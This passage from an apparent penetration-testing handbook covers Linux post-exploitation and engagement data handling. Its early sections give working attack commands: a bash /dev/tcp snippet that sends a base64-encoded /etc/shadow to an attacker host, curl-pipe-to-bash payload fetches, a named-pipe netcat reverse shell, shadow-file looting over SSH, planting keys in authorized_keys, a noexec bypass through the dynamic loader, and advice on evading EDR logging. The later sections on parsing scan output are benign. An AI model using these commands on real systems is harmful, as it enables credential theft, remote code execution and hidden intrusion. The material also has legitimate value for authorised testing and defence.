```bash
exec 3<>/dev/tcp/$ATTACKER/8000
BODY=$(base64 -w0 /etc/shadow)
printf 'POST /up HTTP/1.1\r\nHost: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n%s' \
    "$ATTACKER" "${#BODY}" "$BODY" >&3
cat <&3 >/dev/null
exec 3<&- 3>&-
```

**Verify it worked.** Compare hashes, always, because a truncated transfer of a script produces a confusing runtime error rather than an obvious failure:

```bash
# Attacker
sha256sum payload.bin
# Target
sha256sum /dev/shm/payload.bin || md5sum /dev/shm/payload.bin || cksum /dev/shm/payload.bin
ls -l /dev/shm/payload.bin      # size match is a weaker but instant check
file /dev/shm/payload.bin       # if the "binary" is actually an HTML error page you will see it
```

The most common silent failure is downloading your web server's 404 page. `head -c 100 file` costs nothing.

**Detection and opsec.** No process is spawned for the network activity, so process based telemetry sees only bash, which is why this is quieter than invoking `curl`. It is not invisible: the connection appears in netflow and in any EDR with network telemetry, the parent process making an outbound connection to a raw port is anomalous for a shell, and on hosts with auditd rules on `connect()` it is logged. Writing to `/dev/shm` avoids `/tmp` monitoring and leaves nothing on persistent storage, at the cost of not surviving reboot. Bash 5's `syslog` history option and any configured `PROMPT_COMMAND` logging will capture the command line itself.

**Failure modes.**

| Error | Meaning |
| --- | --- |
| `bash: /dev/tcp/...: No such file or directory` | Bash was built without net redirections, or you are not in bash |
| `bash: connect: Connection refused` | Nothing listening on that port, or a local firewall is rejecting |
| `bash: connect: Connection timed out` | Egress filtered, silently dropped |
| Command hangs forever after headers | Server used keep-alive, you omitted `Connection: close` |
| Output starts with `HTTP/1.1 200` | You did not strip the response headers |
| File is 0 bytes but no error | Listener had no input, or you connected to the wrong port |
| Downloaded file is an HTML page | 404 or a proxy interception page, check the path |

### Deriving a public key from a private key

**What it is.** Given a private key you found, produce the matching public key so you can plant it in an `authorized_keys` file, identify which accounts already trust it, or confirm two files are a pair.

**Why it works.** In RSA, Ed25519 and ECDSA, the public key is not stored separately in any meaningful sense: the private key file contains everything needed to derive it. `ssh-keygen -y` reads the private key and prints the public half in the format `authorized_keys` expects.

```bash
ssh-keygen -y -f id_rsa                       # print the matching public key
ssh-keygen -y -f id_rsa > id_rsa.pub
ssh-keygen -l -f id_rsa                       # fingerprint, for matching against a known list
ssh-keygen -l -f ~/.ssh/authorized_keys       # fingerprints of every key in a file
openssl rsa -in key.pem -pubout               # OpenSSL PEM equivalent, RSA only
openssl pkey -in key.pem -pubout              # any key type OpenSSL supports
```

**Common mistake.** The source gave `ssh-keygen -e -y -f id_rsa`. `-y` prints the public key of a private key file; `-e` exports a key to RFC4716 or PEM format. They are different operations and combining them is not the intended usage. `ssh-keygen -y -f` is the correct invocation for this task. Use `-e` only when you specifically need the RFC4716 encoding, for example to feed a key to a tool that will not accept OpenSSH format.

**Preconditions and failure modes.** If the key is passphrase protected, `-y` prompts, and without the passphrase you get nothing; that is the point at which the file goes to `ssh2john` and a cracker rather than to `ssh-keygen`. SSH refuses to use a private key whose permissions are group or world readable, so `chmod 600` before testing it. A key in PuTTY's `.ppk` format needs `puttygen -O private-openssh` first. Newer OpenSSH refuses `ssh-rsa` signatures with SHA-1 by default, so an old RSA key that "should" work may need `-o PubkeyAcceptedAlgorithms=+ssh-rsa` on the client, which is a very different failure from a wrong key.

```bash
chmod 600 id_rsa
ssh -i id_rsa -o IdentitiesOnly=yes $USER@$TARGET
ssh -i id_rsa -o IdentitiesOnly=yes -o PubkeyAcceptedAlgorithms=+ssh-rsa $USER@$TARGET
ssh2john id_rsa > id_rsa.hash    # then crack it
```

`IdentitiesOnly=yes` is not optional in practice. Without it, SSH offers every key your agent holds before the one you specified, and after a few failures the server closes the connection with `Too many authentication failures`, which looks exactly like a bad key.

### Listing sockets, and what replaced netstat

**What it is.** Finding out what a host is listening on, what it is connected to, and which process owns each socket. This is the first thing you do after landing on a box: local-only listeners are the pivot targets that no external scan will ever show you.

**Why it works.** `netstat` parses the text in `/proc/net/tcp` and friends, which is slow and loses information. `ss` uses the `NETLINK_SOCK_DIAG` interface, asking the kernel directly for socket state in a binary format. It is faster, shows more (socket memory, congestion control state, timers) and supports real filtering. `netstat` is deprecated and frequently absent, `ss` is part of `iproute2` and is present essentially everywhere modern.

```bash
ss -tulpn                   # the one to memorise: TCP+UDP, listening, numeric, with processes
ss -tlnp                    # TCP listeners only
ss -tanp                    # all TCP sockets with processes
ss -s                       # summary counts by protocol and state
ss -tp state established    # established TCP with owning process
ss -xl                      # listening unix domain sockets
ss -tlnp 'sport = :445'     # filter by source port
ss -tn dst 10.0.0.0/8       # connections into a particular network
ss -tni                     # per socket TCP internals, rtt, cwnd, retransmits
ss -tulpn | grep -E '127\.0\.0\.1|::1'   # local-only listeners: your pivot targets
```

The flag letters are worth knowing rather than copying: `-t` TCP, `-u` UDP, `-x` unix, `-l` listening only, `-a` all states, `-n` numeric, do not resolve, `-p` show process, `-r` do resolve, `-s` summary, `-i` internal TCP info, `-e` extended, `-m` memory, `-K` forcibly close matching sockets (needs root and kernel support for socket destruction).

`-n` matters operationally, not just for speed: without it, `ss` and `netstat` do reverse DNS lookups on every address, which generates DNS traffic from the target that a defender can see, and hangs for a long time if DNS is unreachable.

Mapping from the old commands:

| Old | Modern | Notes |
| --- | --- | --- |
| `netstat -tulpn` | `ss -tulpn` | Direct replacement |
| `netstat -antp` | `ss -tanp` | Linux syntax. The source's `netstat -anp tcp` is the BSD and macOS form and errors on Linux |
| `netstat -r` | `ip route` | Also `ip -6 route`, and `ip route get $TARGET` for the route to one host |
| `netstat -i` | `ip -s link` | Per interface counters |
| `netstat -g` | `ip maddr` | Multicast groups |
| `arp -a` | `ip neigh` | The neighbour cache is a free list of live hosts on the segment |
| `ifconfig` | `ip addr` | `ip -br addr` for a compact view |
| `netstat -s` | `nstat` or `ss -s` | Protocol statistics |

`netstat -anp tcp` from the source is macOS and BSD syntax, where the protocol is a positional argument. On Linux it is `netstat -antp`. Getting this wrong on a target wastes a command and prints a usage message, which is noisy.

Other ways to the same information, in order of how likely they are to be available:

```bash
lsof -i -P -n                              # sockets with processes, if lsof exists
lsof -i :445                               # who owns port 445
fuser -n tcp 445                           # PID owning a port, part of psmisc
cat /proc/net/tcp /proc/net/tcp6           # always present, hex encoded
```

**The `/proc/net/tcp` fallback.** When `ss`, `netstat` and `lsof` are all missing, and on stripped containers they often are, `/proc/net/tcp` is still there because it is the kernel's own interface. It is hex encoded and the address bytes are in network-to-host order, so `0100007F:1F90` is `127.0.0.1:8080`. The state column is a hex code:

| Code | State | Code | State |
| --- | --- | --- | --- |
| `01` | ESTABLISHED | `07` | CLOSE |
| `02` | SYN_SENT | `08` | CLOSE_WAIT |
| `03` | SYN_RECV | `09` | LAST_ACK |
| `04` | FIN_WAIT1 | `0A` | LISTEN |
| `05` | FIN_WAIT2 | `0B` | CLOSING |
| `06` | TIME_WAIT | | |

A pure bash decoder for the listeners, which is the case you actually care about:

```bash
while read -r sl local rem st rest; do
    [ "$st" = "0A" ] || continue
    ip=${local%:*}; port=${local#*:}
    printf '%d.%d.%d.%d:%d\n' \
        "0x${ip:6:2}" "0x${ip:4:2}" "0x${ip:2:2}" "0x${ip:0:2}" "0x$port"
done < /proc/net/tcp
```

Note the byte order: the four octets are read backwards out of the hex string, which is the part everyone gets wrong and then concludes the file is corrupt. Change `0A` to `01` for established connections. The tenth field of each line is the socket inode, and you can map that back to a process by searching file descriptors, which is exactly what `lsof` does:

```bash
ls -l /proc/[0-9]*/fd/* 2>/dev/null | grep 'socket:\[12345\]'
grep -l 'socket:\[12345\]' /proc/[0-9]*/net/* 2>/dev/null
```

**Opsec note.** `ss -tulpn` with `-p` requires root to see other users' processes and reads `/proc/*/fd` extensively, which is a distinctive pattern for anything monitoring process introspection. It is normal administrative behaviour and rarely alerted on by itself, but it is often part of a discovery pattern that is scored in aggregate.

### File transfer, ranked by what is present

There is no single right answer, only the first one on the list that works on this host. Start at the top.

**HTTP, if any client exists.**

```bash
curl -fsSL http://$ATTACKER:8000/f -o /dev/shm/f       # -f fails loudly on 404, -sSL quiet but shows errors
curl -fsSL http://$ATTACKER:8000/s.sh | bash           # no disk write at all
wget -q http://$ATTACKER:8000/f -O /dev/shm/f
wget -qO- http://$ATTACKER:8000/s.sh | sh
busybox wget -q -O /dev/shm/f http://$ATTACKER:8000/f
```

`curl -f` is not optional. Without it, an HTTP 404 is written to your output file and exits zero, and you spend ten minutes debugging why your "script" is HTML.

**Raw TCP.**

```bash
# Attacker sends
nc -lvnp 9001 -q0 < f          # -q0: close after EOF (traditional nc)
nc -lvnp 9001 -N < f           # -N: shutdown on EOF (OpenBSD nc)
# Target receives
nc $ATTACKER 9001 > f
cat < /dev/tcp/$ATTACKER/9001 > f       # no nc needed

# Other direction
nc -lvnp 9001 > f                        # attacker
nc -N $ATTACKER 9001 < f                 # target
cat f > /dev/tcp/$ATTACKER/9001          # target, no nc
```

The `nc` incompatibility is a recurring waste of time. The traditional (Hobbit or GNU) `netcat` takes `-l -p PORT`, supports `-e` to execute a program, and uses `-q` for the EOF behaviour. The OpenBSD `netcat` that ships on Debian derivatives takes `-l PORT` with no `-p` required, has no `-e` at all, and uses `-N`. `ncat` from the nmap project is a third implementation with `--ssl`, `--send-only`, `--exec` and access control lists. Check which you have with `nc -h 2>&1 | head -3` before assuming.

**socat, if present, is strictly better than nc** for anything nontrivial because it handles both ends symmetrically and does TLS:

```bash
# Serve a file to whoever connects
socat TCP-LISTEN:9001,reuseaddr,fork FILE:payload.bin
# Receive it
socat -u TCP:$ATTACKER:9001 OPEN:payload.bin,creat,trunc

# With TLS, so the transfer is not readable on the wire
openssl req -x509 -newkey rsa:2048 -nodes -keyout k.pem -out c.pem -days 30 -subj '/CN=x'
cat k.pem c.pem > s.pem
socat OPENSSL-LISTEN:9001,reuseaddr,cert=s.pem,verify=0,fork FILE:payload.bin
socat -u OPENSSL:$ATTACKER:9001,verify=0 OPEN:payload.bin,creat,trunc
```

**SSH and friends, if you have credentials.**

```bash
scp file $USER@$TARGET:/dev/shm/
scp -O file $USER@$TARGET:/dev/shm/       # force legacy SCP protocol; OpenSSH 9+ uses SFTP by default
sftp $USER@$TARGET
rsync -avz -e ssh dir/ $USER@$TARGET:/dev/shm/dir/
tar czf - dir | ssh $USER@$TARGET 'cat > /dev/shm/dir.tgz'
ssh $USER@$TARGET 'cat /etc/shadow' > loot/shadow
ssh $USER@$TARGET 'tar czf - /var/www' | tar xzf - -C loot/
```

The `-O` flag matters on current systems: OpenSSH 9.0 changed `scp` to use the SFTP protocol underneath, which breaks against servers that only speak the old protocol, and breaks wildcard expansion that used to happen remotely.

**Base64 through an existing channel.** When you have a shell but no network path at all, the shell itself is the transport. This is the universal fallback and it always works.

```bash
# Attacker: produce a single line
gzip -9 -c payload.bin | base64 -w0 ; echo
base64 -b 0 payload.bin              # macOS: -b instead of -w

# Target: paste it
echo 'H4sIAAAA...' | base64 -d | gunzip > /dev/shm/payload.bin

# If base64 is missing but xxd or od is present
xxd -p -c 256 payload.bin            # attacker
xxd -r -p <<'EOF' > /dev/shm/payload.bin
4d5a90000300...
EOF

od -An -tx1 payload.bin | tr -d ' \n'      # attacker, when xxd is absent
printf '\x4d\x5a\x90...' > /dev/shm/f      # target, pure shell, no tools at all
```

Practical limits: many shells and C2 channels choke above a few tens of kilobytes per line, and some strip or reflow long lines. Chunk it:

```bash
# Attacker
gzip -9c payload.bin | base64 -w0 | split -b 2048 - chunk.
# Target: paste each chunk appending to one file, then
cat chunk.* | base64 -d | gunzip > /dev/shm/payload.bin
sha256sum /dev/shm/payload.bin
```

Always verify with a hash after a paste based transfer. A single dropped character in the middle of a base64 blob produces a file that decodes and is subtly wrong.

**Other protocols worth remembering.** TFTP is UDP, has no authentication, and exists on a surprising number of embedded and appliance systems where nothing else does. FTP clients exist where HTTP clients do not.

```bash
busybox tftp -g -r payload.bin -l /dev/shm/payload.bin $ATTACKER
tftp $ATTACKER -c get payload.bin
busybox ftpget $ATTACKER /dev/shm/f /f
curl -T loot.tar ftp://$ATTACKER/ --user u:p
```

DNS is the channel of last resort when everything else is blocked but name resolution works, and it is slow enough that you use it for a few kilobytes, not for a binary. `dnscat2` and `iodine` are the established implementations; the primitive is encoding data into subdomain labels of a domain whose nameserver you control.

**Off a Windows host to your Linux box,** the SMB route has changed and the old advice fails:

```bash
impacket-smbserver share $(pwd) -smb2support -user $USER -password $PASS
```

```cmd
net use \\$ATTACKER\share /user:$USER $PASS
copy \\$ATTACKER\share\payload.exe C:\Windows\Temp\
```

Anonymous SMB shares as a transfer mechanism are largely dead on current Windows: guest fallback is disabled and SMB signing is required by default in recent Windows 11 and Server builds, so an unauthenticated `impacket-smbserver` will be refused. Always run it with `-user` and `-password` and authenticate, and expect outbound 445 to be blocked at the perimeter anyway, which is why HTTP remains the workhorse.

### Quick HTTP and file servers

Serving files is the other half of every transfer. Options, in order of how often they are the right choice:

```bash
python3 -m http.server 8000                                  # everywhere python3 exists
python3 -m http.server 8000 --bind 127.0.0.1                 # loopback only, for use over an SSH forward
python3 -m http.server 8000 --directory /srv/payloads        # serve a specific dir, do not cd
python3 -m uploadserver 8000                                 # adds a POST upload endpoint (pip install uploadserver)
php -S 0.0.0.0:8000                                          # if php is present
ruby -run -e httpd . -p 8000
busybox httpd -f -p 8000 -h .                                # -f foreground, on stripped hosts
caddy file-server --listen :8000 --browse
miniserve -p 8000 --upload-files .                           # single static Rust binary, upload support
npx --yes http-server -p 8000
updog -p 8000                                                # python, upload and optional TLS
```

Two things to get right. Serve the narrowest directory that contains what you need: `python3 -m http.server` in your home directory publishes your SSH keys, your engagement notes and your credential files to anyone who can reach the port, and that has happened to people. Use `--directory` and a dedicated `payloads/` tree. Second, bind to loopback and reach it through an SSH forward when you only need one target to see it, rather than exposing a listener to the whole network.

For HTTPS, either because the target only allows 443 outbound or because you want the transfer opaque:

```bash
openssl req -x509 -newkey rsa:2048 -nodes -keyout k.pem -out c.pem -days 30 -subj '/CN=cdn.example'
openssl s_server -accept 443 -cert c.pem -key k.pem -WWW      # serves files from cwd over TLS
socat OPENSSL-LISTEN:443,cert=s.pem,verify=0,fork,reuseaddr FILE:payload.bin
```

Remember the client side then needs to accept a self signed certificate: `curl -k`, `wget --no-check-certificate`. On a target with certificate pinning or a proxy doing TLS inspection, neither will work and you are back to HTTP or a raw socket.

Log your server. It is the only record of which target fetched what, and it is evidence:

```bash
python3 -m http.server 8000 --directory payloads 2>&1 | ts '%FT%T%z' | tee -a logs/http-server.log
```

### The busybox and pure shell layer

`busybox` is a single binary containing several hundred stripped down Unix utilities, and it is the standard userland on embedded systems, on Alpine based containers, and on many appliances. If a host looks like it has almost no tools, check for it first, because it changes the answer entirely.

```bash
busybox --list | tr '\n' ' '     # everything this build supports
busybox | head -40               # applet list plus version
command -v busybox
ls -l /bin/sh                    # often a symlink to busybox
```

Any applet can be invoked as `busybox APPLET ARGS` even when there is no symlink for it on the path, which is the point: a host with only `/bin/busybox` still has `wget`, `nc`, `httpd`, `tftp`, `awk`, `sed`, `base64`, `find`, `ps` and `vi`.

```bash
busybox wget -q -O /dev/shm/f http://$ATTACKER:8000/f
busybox nc $ATTACKER 9001 > /dev/shm/f
busybox httpd -f -p 8000 -h /tmp/serve
busybox tftp -g -r f -l /dev/shm/f $ATTACKER
busybox base64 -d < b64.txt > /dev/shm/f
busybox find / -perm -4000 -type f 2>/dev/null
busybox sh
```

Two caveats. Busybox applets implement a subset of the GNU flags, so options you rely on may be missing and will fail with a usage message rather than doing something subtly different, which is at least honest. And `busybox nc` may or may not support `-e` depending on how the build was configured, so a reverse shell one liner that works on one appliance fails on the next; the portable form uses a named pipe instead:

```bash
rm -f /tmp/p; mkfifo /tmp/p
cat /tmp/p | /bin/sh -i 2>&1 | busybox nc $ATTACKER $LPORT > /tmp/p
```

Below busybox is the pure shell layer, where the only tools are shell builtins. It is worth knowing what is a builtin because those work when the filesystem containing `/bin` is unreadable or `PATH` is broken:

```bash
# Directory listing with no ls
echo *
for f in * .*; do echo "$f"; done
printf '%s\n' /etc/*

# Read a file with no cat
while IFS= read -r l; do printf '%s\n' "$l"; done < /etc/passwd
echo "$(</etc/passwd)"          # bash, one read, no subprocess

# Write a file with no editor
cat > /dev/shm/s.sh <<'EOF'
#!/bin/sh
id
EOF
printf '#!/bin/sh\nid\n' > /dev/shm/s.sh
chmod +x /dev/shm/s.sh

# Find things with no find
shopt -s globstar; printf '%s\n' /var/www/**/*.php     # bash 4+

# Port scan with no nmap, using /dev/tcp
for p in 22 80 139 443 445 3389 5985; do
    (echo >/dev/tcp/$TARGET/$p) >/dev/null 2>&1 && echo "$p open"
done

# Same with a timeout, so a filtered port does not hang for two minutes
for p in $(seq 1 1024); do
    timeout 1 bash -c "echo >/dev/tcp/$TARGET/$p" 2>/dev/null && echo "$p open"
done
```

And the location question. When `/tmp` is `noexec`, the candidates in order are `/dev/shm` (tmpfs, usually executable, RAM backed so it vanishes on reboot and leaves nothing on disk), `/var/tmp` (persistent, often not `noexec`), `$HOME`, and any world writable directory you can find:

```bash
mount | grep -E 'noexec'
find / -writable -type d 2>/dev/null | grep -vE '^/(proc|sys)' | head -20
```

Interpreted code sidesteps `noexec` entirely, because the kernel's `noexec` check applies to `execve()` on the file, not to a shell or interpreter reading it as data:

```bash
sh /tmp/script.sh            # works on noexec, the file is read not executed
bash < /tmp/script.sh
python3 /tmp/x.py
perl /tmp/x.pl
/lib64/ld-linux-x86-64.so.2 /tmp/binary     # invoke the loader directly on an ELF
```

That last one is worth remembering. `noexec` stops `execve()` on the binary, but the dynamic loader is an executable on a normal filesystem and it will happily map and run an ELF passed to it as an argument.

## Output and data wrangling for engagement data

Every phase of an engagement produces text, and every phase consumes a list derived from the previous phase's text. Doing this badly is how you scan the wrong hosts, spray an account twice, or miss a subnet.

### One canonical targets file

`scope/targets.txt` is the single source of truth: one target per line, no comments, no ports, no blank lines, no trailing whitespace. Everything else in the tree is derived from it by a command you can rerun, not by hand editing. When the client adds a range, you change one file and regenerate.

```bash
# Normalise whatever the client sent you into the canonical form
tr -d '\r' < scope/in-scope.txt \
  | sed -e 's/#.*$//' -e 's/^[[:space:]]*//' -e 's/[[:space:]]*$//' \
  | grep -v '^$' \
  | sort -u > scope/targets.raw

# Apply exclusions at generation time, so out of scope hosts cannot leak into a scan
grep -vxF -f scope/exclude.txt scope/targets.raw > scope/targets.txt
wc -l scope/targets.raw scope/targets.txt
```

`tr -d '\r'` first, always. Scope arrives as a Windows text file or pasted out of a spreadsheet, and a trailing carriage return turns `10.0.0.1` into `10.0.0.1\r`, which fails to resolve, fails to match your exclude list, and produces error messages that look identical to a typo because the offending byte is invisible. `cat -A` or `file` will show you.

`grep -vxF -f` is the correct exclusion idiom: `-F` treats patterns as fixed strings so a dot is a dot rather than any character, `-x` requires a whole line match so `10.0.0.1` does not exclude `10.0.0.10`, and `-v` inverts. Getting either flag wrong silently removes more than you meant. Verify by counting.

Expanding CIDRs into a host list, when you need one line per host:

```bash
prips 10.0.0.0/24
nmap -sL -n 10.0.0.0/24 | awk '/Nmap scan report/{print $NF}'
mapcidr -cidr 10.0.0.0/22 -silent
ipcalc -n -b 10.0.0.0/22
```

`nmap -sL -n` is the useful one to remember because nmap is always installed and `-sL` sends no packets at all, it only lists what would be scanned. Keep the CIDR form as the canonical scope where you can, and expand only where a tool needs a host list, because a 4000 line file of individual addresses is harder to review against the rules of engagement than `10.0.0.0/22`.

### Sorting and deduplicating IP addresses

Plain `sort` compares strings byte by byte, which is wrong for dotted quads in two distinct ways. `10.0.0.2` sorts after `10.0.0.10` because `1` precedes `2` at the third character, and `9.1.1.1` sorts after `100.1.1.1` because `9` is greater than `1`. The result looks sorted at a glance and is not, which is worse than obviously unsorted, because you will scroll past a range assuming it is where it should be.

```bash
sort ips.txt                            # WRONG for IPs, lexicographic
sort -V ips.txt                         # version sort, correct for dotted quads
sort -u -V ips.txt                      # sorted and deduplicated
sort -t. -k1,1n -k2,2n -k3,3n -k4,4n -u ips.txt   # explicit numeric per octet, unambiguous
```

`sort -V` treats the input as version strings, comparing dot separated components numerically, which happens to be exactly the semantics an IPv4 address needs. It is the short form to reach for. The explicit four key numeric sort is what to use when you want no doubt at all about the behaviour, particularly in a script that someone else will read, and it is the one that is provably correct for anything shaped like `a.b.c.d`. Be aware `-V` has opinions about non numeric components and mixed content, so if the file contains hostnames as well as addresses, split it first rather than trusting version sort to do something sensible with both.

For `host:port` lines, sort the address as a version and the port numerically:

```bash
sort -t: -k1,1V -k2,2n -u hostports.txt
```

Deduplication has a trap of its own. `uniq` only collapses adjacent duplicates, so it does nothing useful on unsorted input, and `uniq` after a plain `sort` on IPs is still deduplicating correctly even though the order is wrong. When you must preserve the original order, for example because the file is in discovery order and that is meaningful, use awk rather than sort:

```bash
awk '!seen[$0]++' file          # dedupe, keep first occurrence, preserve order
sort file | uniq -d             # show only the duplicated lines
sort file | uniq -c | sort -rn  # frequency count, most common first
```

Set operations between lists come up constantly, "which hosts have I not scanned yet", "which credentials are new". `comm` does this and requires both inputs sorted with the same collation, which is the part people forget:

```bash
comm -23 <(sort all.txt) <(sort done.txt)     # in all but not in done
comm -12 <(sort a.txt) <(sort b.txt)          # in both
comm -13 <(sort a.txt) <(sort b.txt)          # only in b
grep -vxF -f done.txt all.txt                  # same as -23, no sorting needed, slower on big files
```

Sort with `LC_ALL=C` when the inputs came from different machines or locales, because locale dependent collation will produce two differently sorted files that `comm` then compares incorrectly and silently.

### Turning scan output into target lists

Always run nmap with `-oA`, which writes normal, greppable and XML output simultaneously. The greppable file is a stable single line per host format, which makes it the right thing to parse in a hurry, and the XML is the right thing to parse properly.

```bash
nmap -sS -p- --min-rate 1000 -iL scope/targets.txt -oA scans/nmap/$(date -u +%Y%m%dT%H%M%SZ)-tcp-full

# Hosts that were up
awk '/Status: Up/{print $2}' scans/nmap/*.gnmap | sort -uV > scope/live.txt

# Every open host:port pair
awk '/Ports:/ {
    split($0, h, /Host: /); split(h[2], hh, / /); ip = hh[1]
    split($0, p, /Ports: /); n = split(p[2], ports, /, /)
    for (i = 1; i <= n; i++)
        if (ports[i] ~ /\/open\//) { split(ports[i], f, "/"); print ip ":" f[1] }
}' scans/nmap/*.gnmap | sort -t: -k1,1V -k2,2n -u > scans/nmap/open.txt

# Hosts with a specific service open, the input to the next tool
grep -E '(^|[ ,])445/open' scans/nmap/*.gnmap | awk '{print $2}' | sort -uV > scope/smb.txt
grep -E '(^|[ ,])(80|443|8080|8443)/open' scans/nmap/*.gnmap | awk '{print $2}' | sort -uV > scope/web.txt
```

The XML is the better source when correctness matters more than speed, because it is structured and does not depend on field positions. `nmap-parse-output` and `nmaptocsv` both consume it, and the stylesheet nmap ships turns it into an HTML report:

```bash
xsltproc scans/nmap/scan.xml -o scans/nmap/scan.html
nmap-parse-output scans/nmap/scan.xml http-ports
nmaptocsv -i scans/nmap/scan.xml -f ip-fqdn-port-protocol-service > scans/nmap/scan.csv
```

The modern fast path is to split discovery from enumeration: something fast and dumb finds the open ports, nmap or a protocol specific tool then interrogates only those. That keeps a full range scan of a large network to minutes instead of hours.

```bash
masscan -p1-65535 --rate 5000 -iL scope/targets.txt -oL scans/masscan.txt
awk '/^open/{print $4":"$3}' scans/masscan.txt | sort -t: -k1,1V -k2,2n -u > scans/open.txt

naabu -list scope/targets.txt -top-ports 1000 -json -o scans/naabu.json
jq -r '"\(.ip):\(.port)"' scans/naabu.json | sort -t: -k1,1V -k2,2n -u > scans/open.txt

# Feed the results back into nmap for version and script detection, grouped by port
cut -d: -f2 scans/open.txt | sort -un | while read -r port; do
    grep ":$port\$" scans/open.txt | cut -d: -f1 > /tmp/h.$port
    nmap -sVC -p "$port" -iL /tmp/h.$port -oA "scans/nmap/svc-$port"
done
```

The projectdiscovery chain composes on stdin and stdout, which is the point of it, and each stage emits JSON you can keep as evidence:

```bash
subfinder -d $DOMAIN -silent | dnsx -silent -a -resp | tee recon/resolved.txt
subfinder -d $DOMAIN -silent | httpx -json -o recon/httpx.json
jq -r 'select(.status_code == 200) | .url' recon/httpx.json > recon/live-urls.txt
jq -r 'select(.tech // [] | index("WordPress")) | .url' recon/httpx.json
```

### CSV, cut, and join

`cut` is the fast answer and it is wrong on real CSV, because it has no concept of quoting. A field containing a comma inside quotes, which is normal in exported data and universal in anything that contains a distinguished name, silently shifts every subsequent column. The source's `cut -d ',' -f 2` on a BloodHound host export is exactly this trap: it works until a host has a comma in a description field and then quietly returns the wrong column.

```bash
cut -d, -f2 hosts.csv                   # fine for machine generated, quote free CSV
cut -d, -f1,3-5 hosts.csv
cut -f2 -d, --output-delimiter=' ' hosts.csv
awk -F, '$3 == "true" {print $1}' hosts.csv
awk -F'\t' '{print $1, $4}' file.tsv    # prefer TSV where you control the format
```

For anything you did not generate yourself, use a tool that parses CSV properly:

```bash
csvcut -c ip,hostname,os hosts.csv                     # csvkit, columns by name not position
csvcut -n hosts.csv                                     # list column names and indices
csvgrep -c os -m 'Server 2019' hosts.csv | csvcut -c ip
csvjoin -c ip hosts.csv creds.csv                       # proper join on a named column
csvsql --query "select ip from hosts where os like '%2019%'" hosts.csv
csvlook hosts.csv | head                                # human readable table

mlr --icsv --opprint cat hosts.csv                      # Miller, no dependencies beyond the binary
mlr --icsv --ojson cat hosts.csv                        # CSV to JSON, then use jq
mlr --icsv --ocsv filter '$port == 445' then cut -f ip hosts.csv
mlr --icsv --ojson join -j ip -f hosts.csv creds.csv

qsv select ip,hostname hosts.csv                        # fast on large files
qsv frequency -s os hosts.csv
```

Prefer generating TSV over CSV whenever the format is your choice, because tabs almost never occur inside field values and `cut -f`, `awk -F'\t'` and `join` all handle it without quoting rules.

`join` is the POSIX relational join and, like `comm`, it requires both inputs sorted on the join field with the same collation. That precondition is the source of nearly every "join returns nothing" report:

```bash
join -t, -1 1 -2 1 <(sort -t, -k1,1 hosts.csv) <(sort -t, -k1,1 owners.csv)
join -t, -a1 -e 'UNKNOWN' -o 0,1.2,2.2 <(sort -t, -k1,1 a.csv) <(sort -t, -k1,1 b.csv)
```

`-a1` keeps unmatched lines from the first file, which is what you want when the question is "which hosts have no owner recorded" rather than "which hosts do".

### jq for JSON tool output

Modern tooling emits JSON, usually JSON Lines with one object per line, which `jq` consumes naturally because it reads a stream of values rather than a single document. Learning six `jq` idioms removes the need for a Python script in almost every case.

```bash
# Explore an unfamiliar schema before writing a filter
jq -r 'keys' out.json | head
jq -r '[paths(scalars)|join(".")] | unique[]' out.json | head -50
jq -s 'length' out.json            # slurp everything into one array, count it

# Extract, filter, reshape
jq -r '.[] | .ip' out.json
jq -r '.results[] | select(.port == 445) | .host' out.json
jq -r 'select(.status_code >= 200 and .status_code < 400) | .url' httpx.json
jq -r '"\(.host):\(.port) \(.service // "unknown")"' out.json
jq -r '[.ip, .hostname, .os] | @csv' out.json > hosts.csv
jq -r '[.ip, .hostname] | @tsv' out.json
jq -r 'to_entries[] | "\(.key)=\(.value)"' single.json

# JSON Lines specifics
jq -c 'select(.severity == "high")' nuclei.jsonl        # compact, one line per result
jq -s 'group_by(.host) | map({host: .[0].host, n: length})' nuclei.jsonl
jq -rn '[inputs | .url] | unique | .[]' *.jsonl         # -n with inputs: stream many files

# Turn a nested structure flat enough for grep and sort
jq -r '.data[] | .Properties | [.name, .operatingsystem, (.enabled|tostring)] | @tsv' computers.json
```

`// "default"` is the alternative operator and it is the fix for the most common `jq` annoyance: a field missing on some objects makes the whole filter emit `null` and your output line becomes `nullnull`. `.service // "unknown"` handles it. `jq -e` sets a non-zero exit status when the result is null or false, which is what you want in a script that branches on a result. `jq -r` emits raw strings rather than JSON quoted ones, and forgetting it is why your target list has quotes in it and every subsequent tool fails.

Related tools worth knowing exist: `gojq` and `jaq` are faster reimplementations with mostly compatible syntax, `yq` applies `jq` filters to YAML, and `jless` is a pager for JSON that beats `jq | less` when you are exploring rather than extracting.

A note on schema stability. Filters written against a specific tool's JSON, and BloodHound's collector output is the standard example, break when the tool's schema version changes. BloodHound CE's JSON differs from legacy BloodHound's, so a filter copied from a 2020 write up will return nothing rather than erroring. When a filter comes back empty, check the schema with `jq 'keys'` before assuming the data is absent.

### Keeping derived data honest

Two habits stop the data side of an engagement from rotting.

**Derived files are generated, never edited.** Put the generation commands in a script or a `Makefile` in the engagement root so that regenerating everything from `scope/targets.txt` and the raw scan output is one command. When the client extends scope on day three, you rerun it rather than trying to remember which of eleven derived lists need updating.

```text
# Makefile in the engagement root
targets := scope/targets.txt

scope/live.txt: scans/nmap/*.gnmap
	awk '/Status: Up/{print $$2}' $^ | sort -uV > $@

scope/smb.txt: scans/nmap/*.gnmap
	grep -E '(^|[ ,])445/open' $^ | awk '{print $$2}' | sort -uV > $@

scope/web.txt: scans/nmap/*.gnmap
	grep -E '(^|[ ,])(80|443|8080|8443)/open' $^ | awk '{print $$2}' | sort -uV > $@

.PHONY: lists
lists: scope/live.txt scope/smb.txt scope/web.txt
	wc -l scope/*.txt
```

**Count everything, at every step.** `wc -l` before and after any filter. A pipeline that silently produces an empty file, because a field position moved or a carriage return broke a match, is the most common data bug on an engagement and it looks exactly like "no results", which you will believe. If a filter unexpectedly returns nothing, suspect the filter before you suspect the network.

```bash
wc -l scope/targets.txt scope/live.txt scope/smb.txt scope/web.txt
comm -23 <(sort scope/targets.txt) <(sort scope/live.txt) | wc -l   # how many did not respond
```


## The tooling landscape and what changed

The original notes were a snapshot of one operator's toolbox in roughly 2020. Most of the techniques in them still work. A large fraction of the tools do not, or work only in a degraded way, or have been renamed so that copy-pasting the command produces `command not found` and nothing else. This section is the orientation map: what died, what replaced it, what capability you actually need at each stage, and how to keep a toolbox that does not rot.

Four forces did the damage, and understanding them lets you predict the next round of breakage rather than rediscovering it mid-engagement.

